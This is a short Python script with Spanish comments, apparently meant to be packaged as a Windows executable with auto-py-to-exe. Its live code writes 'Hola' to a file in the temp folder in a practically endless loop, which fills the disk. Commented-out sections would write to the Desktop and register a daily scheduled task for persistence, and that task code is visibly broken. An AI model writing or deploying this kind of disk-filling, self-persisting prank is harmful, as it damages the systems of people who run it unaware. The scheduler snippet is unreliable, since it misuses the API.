#https://pypi.org/project/auto-py-to-exe/
import os
import tempfile

# Obtiene la ruta de la carpeta temp
temp_path = tempfile.gettempdir()
# Crea la ruta completa del archivo
file_path = os.path.join(temp_path, "archivo.txt")
# Abre el archivo en modo de escritura
with open(file_path, "w") as file:
    counter = 0

    # Inicia el bucle while
    while counter < 99999999999999999999999999999999999999999999999999999:
        # Escribe el mensaje en el archivo
        file.write("Hola\n")

        # Incrementa el contador en 1
        counter += 1


###### AL ESCRITORIO ######

#desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
#file_path = os.path.join(desktop_path, "archivo.txt")
#
#with open(file_path, "w") as file:
#    file.write("Hola")
    

######## TAREA PROGRAMADA ########


#import win32com
#import win32com.client
#
# Crea una instancia del objeto TaskScheduler
#scheduler = win32com.client.Dispatch("Schedule.Service")
#
# Conecta al servicio de programación de tareas
#scheduler.Connect()
#
# Obtiene la carpeta raíz de tareas programadas
#folder = scheduler.GetFolder("\\")
#
# Crea una tarea programada sin especificar un usuario y una contraseña
#task = folder.RegisterTaskDefinition(
#    "Mi tarea programada", # Nombre de la tarea
#    win32com.client.constants.TASK_CREATE_OR_UPDATE, # Opción de actualización
#    win32com.client.Dispatch("Microsoft.Windows.PowerShell"), # Programa/script
#    "", # Argumentos
#    win32com.client.constants.TASK_LOGON_NONE, # Tipo de inicio de sesión
#    "", # Usuario
#    "", # Contraseña
#    win32com.client.constants.TASK_RUN_NO_FLAGS # Opciones de ejecución
#)
#
# Crea un disparador diario
#trigger = task.Triggers.Create(win32com.client.constants.TASK_TRIGGER_DAILY)
#
# Establece la hora de inicio en 10:00 AM
#trigger.StartBoundary = "2022-12-31T10:00:00"
#
# Establece la frecuencia en 1 día
#trigger.DaysInterval = 1
#
# Establece el final del disparador en 2022-12-31
#trigger.EndBoundary = "2022-12-31T10:00:00"
